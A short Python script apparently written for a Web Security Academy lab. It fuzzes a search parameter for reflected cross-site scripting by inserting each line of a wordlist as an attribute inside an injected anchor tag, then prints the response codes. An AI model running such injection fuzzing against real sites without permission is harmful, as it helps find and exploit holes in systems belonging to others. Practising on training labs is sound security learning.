import requests


wordlist_path = "word.txt"

# Read the wordlist
with open(wordlist_path, 'r') as file:
    payloads = file.readlines()


for payload in payloads:
    url = f'https://0abe0077039db5aa82e41518008900b7.web-security-academy.net/?search=</h1><a {payload} >hello</a>'
    response = requests.get(url)
    print(response.status_code, payload, url)
